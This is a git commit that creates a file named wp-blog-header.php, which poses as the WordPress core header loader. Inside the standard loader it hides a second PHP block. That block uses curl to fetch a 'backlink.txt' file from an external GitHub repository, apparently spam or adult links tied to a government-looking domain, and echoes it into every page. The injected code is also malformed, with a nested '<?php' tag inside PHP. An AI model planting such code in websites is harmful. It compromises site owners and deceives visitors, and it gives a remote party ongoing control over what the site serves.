6404aac41b691b9e7034266d81a25ec80bd2a7f0
/SLoerD <98331189+BadaxHaxor@users.noreply.github.com>
2023-07-30 19:55:10 +0700

    Create wp-blog-header.php
    Signed-off-by: ./SLoerD <98331189+BadaxHaxor@users.noreply.github.com>

---
+++ wp-blog-header.php
@@ -0,0 +1,30 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+<?php
+$curl = curl_init();
+$url = 'https://raw.githubusercontent.com/BadaxHaxor/bokep.visorideags.gob.mx/main/backlink.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;?>
+
+}
